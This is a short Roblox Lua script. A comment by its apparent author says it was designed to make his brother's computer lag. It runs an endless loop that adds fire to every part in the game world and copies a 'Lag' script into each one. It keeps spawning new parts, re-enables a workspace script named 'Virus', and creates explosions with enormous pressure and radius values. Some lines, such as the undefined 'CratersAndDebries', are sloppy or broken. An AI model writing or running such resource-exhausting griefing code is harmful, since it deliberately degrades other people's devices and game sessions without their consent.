

while true do --forever
	wait()
	for i, part in ipairs(workspace:GetChildren()) do
		if part.ClassName == "Part" or part.ClassName == "UnionOperation" then
			local part2 = Instance.new("Fire")-- make fire
			part2.Parent = part
			part2.Size = 30
			part2.Heat = 25
			script.Fire:Clone().Parent = part2.Parent
			script.Lag:Clone().Parent = part
		end
	end
	local part = Instance.new("Part")
	part.Anchored = false
	part.BrickColor = BrickColor.new("Really red")
	part.Name = "jahflajhfdkljah"
	part.Parent = workspace
	script.Lag:Clone().Parent = part
	print("archmantella13's Lag Script")
	game.workspace.Virus.Disabled = false --or i could have done it a diffrent war but lets lag.
	script.Disabled = false -- see?
	local part4235 = Instance.new("Explosion")-- make boomb
	part4235.BlastPressure = 100000000000000000000000000000000000000000000000000000000000000000000000000000000
	part4235.BlastRadius = 1840375023845794000000000829345702347509345703947290427
	part4235.ExplosionType = (CratersAndDebries)
end

--[[

This was Desinged to make my brothers computer lag 😀
It works (I think...)

]]
